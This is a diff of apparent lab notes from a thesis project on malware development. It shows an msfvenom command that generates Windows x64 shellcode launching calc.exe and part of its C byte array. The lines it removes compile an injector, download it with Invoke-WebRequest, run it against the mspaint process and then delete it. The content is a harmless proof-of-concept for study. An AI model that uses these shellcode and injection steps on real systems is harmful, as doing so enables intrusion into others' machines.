@@ -1,4 +1,4 @@
-                                                                                                                                                                                                                                            
+
 ┌──(kali㉿kali)-[~]
 └─$ msfvenom --platform windows --arch x64 -p windows/x64/exec -f c cmd="calc.exe"               
 
@@ -26,22 +26,6 @@ unsigned char buf[] =
 "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
 "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
 "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
-                                                                                                                                                                                                                                            
+                                                      
 
 
-x86_64-w64-mingw32-gcc -o ./exec/shellcodeInjection.exe shellcodeInjection.c 
-
-
-
-
-mspaint
-Invoke-WebRequest -Uri https://github.com/PaulaMerino/TFM/raw/main/exec/shellcodeInjection.exe -OutFile "$env:USERPROFILE\Downloads\shellcodeInjection.exe"
-& "$env:USERPROFILE\Downloads\shellcodeInjection.exe" (Get-Process | ?{$_.ProcessName -eq "mspaint"} | Select-Object -ExpandProperty Id)
-
-
-CLEAN UP
-Remove-Item "$env:USERPROFILE\Downloads\shellcodeInjection.exe"
-
-
-https://www.crow.rip/crows-nest/mal/dev/inject/syscalls
-https://www.youtube.com/watch?v=P1PHRcmPM7c&ab_channel=crow
